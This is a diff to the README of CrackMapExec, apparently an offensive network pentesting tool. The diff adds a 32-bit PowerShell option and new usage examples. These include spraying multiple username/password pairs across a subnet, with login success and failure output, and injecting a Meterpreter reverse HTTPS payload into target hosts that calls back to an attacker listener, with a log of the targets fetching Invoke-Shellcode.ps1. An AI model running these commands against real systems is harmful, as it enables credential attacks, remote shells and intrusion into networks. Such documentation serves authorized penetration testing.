@@ -101,6 +101,7 @@ Command Execution:
 
   --execm {atexec,wmi,smbexec}
                         Method to execute the command (default: smbexec)
+  --force-ps32          Force all PowerShell code/commands to run in a 32bit process
   -x COMMAND            Execute the specified command
   -X PS_COMMAND         Excute the specified powershell command
 
@@ -109,7 +110,7 @@ Shellcode/EXE/DLL/Meterpreter Injection:
 
   --inject {met_reverse_http,met_reverse_https,exe,shellcode,dll}
                         Inject Shellcode, EXE, DLL or Meterpreter
-  --path PATH           Path to the Shellcode/EXE/DLL you want to inject on the target systems
+  --path PATH           Path to the Shellcode/EXE/DLL you want to inject on the target systems (ignored if injecting Meterpreter)
   --procid PROCID       Process ID to inject the Shellcode/EXE/DLL/Meterpreter into (if omitted, will inject within the running PowerShell process)
   --exeargs EXEARGS     Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)
   --met-options LHOST LPORT
@@ -146,6 +147,19 @@ Quick credential validation:
 [+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
 [+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
 [+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
+```
+
+Specify multiple user/pass combinations from the command line or a file:
+```
+#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username1,username2 -p password1,password2
+[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[+] 192.168.2.5:445 Login successful 'HRBOX\username1:password2'
+[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
+[+] 192.168.2.6:445 Login successful 'DESKTOP-QDVNP6B\username1:password2'
 ```
 
 Let's enumerate available shares:
@@ -266,6 +280,21 @@ Lets Spider the C$ share starting from the ```Users``` folder for the pattern ``
 //172.16.206.130/Users/drugdealer/AppData/Roaming/Microsoft/Windows/Recent/superpasswords.txt.lnk
 //172.16.206.130/Users/drugdealer/Desktop/superpasswords.txt.txt
 [+] 172.16.206.130:445 DESKTOP-QDVNP6B Done spidering (Completed in 38.6000130177)
+```
+
+Directly inject Meterpreter into memory forcing the Powershell code to run in a 32bit process
+```
+#~ python crackmapexec.py -t 100 192.168.2.5-6 -u username -p password --force-ps32 --inject met_reverse_https --met-options 192.168.2.1 4545
+
+[*] Press CTRL-C at any time to exit
+[*] Note: This might take some time on large networks! Go grab a redbull!
+
+[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:HRBOX) (domain:HRBOX)
+[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:AVERAGEJOEBOX) (domain:AVERAGEJOEBOX)
+[+] 192.168.2.5:445 Login successful 'HRBOX\username:password'
+[+] 192.168.2.6:445 Login successful 'AVERAGEJOEBOX\username:password'
+192.168.2.6 - - [08/Oct/2015 12:50:56] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
+192.168.2.5 - - [08/Oct/2015 12:50:58] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
 ```
 
 #To do
